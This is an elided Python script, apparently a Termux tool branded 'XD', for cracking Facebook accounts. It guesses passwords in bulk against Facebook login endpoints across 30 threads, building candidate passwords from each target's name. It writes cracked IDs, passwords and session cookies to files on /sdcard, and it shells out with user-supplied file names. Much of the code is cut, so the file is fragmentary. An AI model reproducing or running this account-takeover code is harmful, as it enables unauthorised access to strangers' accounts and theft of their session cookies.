...
from concurrent.futures import ThreadPoolExecutor as ahmadXD
from string import * 
...
██   ██ ██   ██ ██      ██ ██   ██ ██████        ██   ██ ██████ 
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Muhammad Ahmad
\033[1;37m Facebook:            Ahmed Gaming
\033[1;37m Github  :            AHMAD-XD-22
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back XD Menu ")
        exit()
...
def ahmad():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/JaSxayO8ohs7X4InIpaXBw')
        pass
    elif select =='F':
        os.system('xdg-open https://m.facebook.com/groups/685732039342402/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        XD(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[XD] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);XDb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={XDb};{ckkk}"
                    print(f"\r{R} [XD-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/XD_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/XD_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [XD-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/XD_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[XD] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [XD-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/XD_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/XD_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [XD-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[XD] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[XD] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [XD-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/XD_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with ahmadXD(max_workers=30) as XDworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                XDworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                XDworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                XDworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                XDworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/XD.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/XD.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    XD = input('Put File Name :')
    print(" ")
    ahmad = input('Saving Put File Name :')
    os.system('touch ' +ahmad)
    os.system('sort -r '+XD+' | uniq > '+ahmad)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + XD )
    print(47*'-')
    print("File Saved To :" + ahmad )
    print(47*'-')
    input(f"{S} Press Enter To Back XD Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/XD.txt\n') 
        filepath = input("Put File Name: ")
